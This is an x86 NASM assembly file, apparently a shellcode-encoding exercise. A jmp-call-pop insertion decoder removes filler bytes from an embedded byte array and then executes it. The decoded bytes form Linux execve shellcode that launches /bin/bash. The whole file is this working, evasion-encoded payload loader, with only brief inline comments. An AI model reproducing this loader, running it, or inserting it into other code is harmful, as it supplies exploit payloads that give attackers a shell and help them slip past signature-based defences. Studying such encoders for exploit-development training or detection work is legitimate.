global _start

section prog write exec

_start:
	jmp short call_decoder

decoder:
	pop esi
	lea edi, [esi+1] ;edi is +1 ahead of esi
	xor eax, eax
	inc al
decode:
	mov bl, byte [esi+eax] ;bl now to the first filler character
	xor bl, 0xff ;this is how we know we've ended our shellcode (zeroflag would be set)
	jz short shellcode ;if we have finished, then execute
	mov bl, byte [esi + eax + 1]  ;otherwise, move the next byte into bl
	mov byte [edi], bl ;then move that byte from bl to the destination
	inc edi ;increment the destination
	add al, 2 ;increment the filler ctr by 2
	jmp short decode ;loop

call_decoder:
	call decoder
	shellcode: db 0x31,0x51,0xc0,0xab,0x50,0xad,0x68,0x69,0x62,0x1f,0x61,0xb0,0x73,0x9a,0x68,0xb1,0x68,0xba,0x62,0x40,0x69,0x21,0x6e,0xb9,0x2f,0xc3,0x68,0x78,0x2f,0x61,0x2f,0xc2,0x2f,0x55,0x2f,0x88,0x89,0x27,0xe3,0x02,0x50,0x54,0x89,0x43,0xe2,0xfb,0x53,0xdf,0x89,0x21,0xe1,0x6d,0xb0,0x19,0x0b,0x05,0xcd,0x79,0x80,0xb5,0xff
